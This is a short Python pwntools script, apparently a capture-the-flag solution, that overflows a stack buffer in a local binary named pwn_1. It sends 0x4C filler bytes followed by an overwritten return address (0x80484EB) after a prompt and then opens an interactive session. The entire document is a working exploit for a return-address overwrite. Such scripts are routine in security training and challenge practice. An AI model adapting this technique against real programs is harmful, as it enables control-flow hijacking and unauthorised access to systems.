from pwn import *

payload = "a"*0x4C+p32(0x80484EB)  

io = process('./pwn_1')
io.recvuntil('Just input something?')

io.sendline(payload)
io.interactive()
